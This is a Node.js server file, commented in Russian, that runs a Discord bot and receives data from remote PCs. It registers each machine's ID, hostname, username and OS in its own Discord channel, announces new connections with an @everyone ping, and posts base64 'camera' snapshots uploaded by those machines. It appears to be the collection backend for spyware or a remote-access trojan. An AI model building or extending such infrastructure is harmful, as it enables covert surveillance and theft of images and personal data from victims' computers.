// server.js
import express from "express";
import { Client, GatewayIntentBits, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";
const LOG_CHANNEL_NAME = "сервер-логи";

const app = express();
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// кэш
let LOG_CHANNEL_ID = null;
const channelCacheByGuild = new Map();
const channelByPC = {};

// ---------- функции ----------

// получить или создать категорию
async function getOrCreateCategory(guild, name) {
    const channels = await guild.channels.fetch();
    let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if (!category) {
        category = await guild.channels.create({
            name,
            type: ChannelType.GuildCategory,
        });
        await logToDiscord(`📂 Создана категория: ${name}`);
    }
    return category;
}

// получить или создать текстовый канал
async function getOrCreateTextChannel(guild, name, parentId) {
    const gid = guild.id;
    if (!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);

    const key = `${name}::${parentId}`;
    if (cache[key]) return cache[key];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(
        c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
    );

    if (matches.size >= 1) {
        cache[key] = matches.first();
        return matches.first();
    }

    const created = await guild.channels.create({
        name,
        type: ChannelType.GuildText,
        parentId: parentId,
    });

    cache[key] = created;
    await logToDiscord(`📌 Создан канал: ${name} (в категории ${parentId})`);
    return created;
}

// получить или создать лог-канал
async function getOrCreateLogChannel(guild) {
    const channels = await guild.channels.fetch();
    let logChannel = channels.find(
        c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL_NAME
    );

    if (!logChannel) {
        logChannel = await guild.channels.create({
            name: LOG_CHANNEL_NAME,
            type: ChannelType.GuildText,
        });
        await logToDiscord("📝 Создан новый лог-канал");
    }
    return logChannel;
}

// логирование
async function logToDiscord(message) {
    try {
        if (!LOG_CHANNEL_ID) {
            const guild = await client.guilds.fetch(GUILD_ID);
            const channel = await getOrCreateLogChannel(guild);
            LOG_CHANNEL_ID = channel.id;
        }

        const channel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
        if (!channel) {
            const guild = await client.guilds.fetch(GUILD_ID);
            const newLogChannel = await getOrCreateLogChannel(guild);
            LOG_CHANNEL_ID = newLogChannel.id;
            return await newLogChannel.send(message);
        }

        await channel.send(message);
    } catch (err) {
        console.error("Ошибка логирования:", err);
    }
}

// ---------- REST API ----------

// загрузка ПК
app.post("/upload-pc", async (req, res) => {
    try {
        const { pcId, hostname, username, os } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        const guild = await client.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);

        let finalChannel = null;
        if (channelByPC[pcId]) {
            finalChannel = await client.channels.fetch(channelByPC[pcId]).catch(() => null);
        }

        if (!finalChannel) {
            finalChannel = await getOrCreateTextChannel(guild, pcId, category.id);
            channelByPC[pcId] = finalChannel.id;

            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
        }

        await finalChannel.send(
            `💻 **ПК:** ${pcId}\n👤 Пользователь: ${username || "?"}\n🖥️ Хост: ${hostname || "?"}\n🪟 ОС: ${os || "?"}`
        );

        res.json({ ok: true });
    } catch (err) {
        await logToDiscord(`❌ Ошибка upload-pc: ${err.message}`);
        res.status(500).json({ error: err.message });
    }
});

// загрузка скрина
app.post("/upload-cam", async (req, res) => {
    try {
        const { pcId, imageBase64 } = req.body;
        if (!pcId || !imageBase64) return res.status(400).json({ error: "pcId и imageBase64 required" });

        let channelId = channelByPC[pcId];
        if (!channelId) {
            await logToDiscord(`❌ ПК ${pcId} не найден при upload-cam`);
            return res.status(404).json({ error: "PC not registered" });
        }

        const channel = await client.channels.fetch(channelId).catch(() => null);
        if (!channel) {
            await logToDiscord(`❌ Канал для ПК ${pcId} удалён`);
            return res.status(404).json({ error: "Channel not found" });
        }

        const buffer = Buffer.from(imageBase64, "base64");
        await channel.send({ content: `📸 Новый снимок с ПК ${pcId}`, files: [{ attachment: buffer, name: "screenshot.png" }] });

        res.json({ ok: true });
    } catch (err) {
        await logToDiscord(`❌ Ошибка upload-cam: ${err.message}`);
        res.status(500).json({ error: err.message });
    }
});

// ---------- запуск ----------

client.once("clientReady", () => {
    console.log(`Бот залогинился как ${client.user.tag}`);
    logToDiscord("✅ Сервер запущен и бот онлайн");
});

client.login(DISCORD_BOT_TOKEN);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Сервер слушает порт ${PORT}`);
});
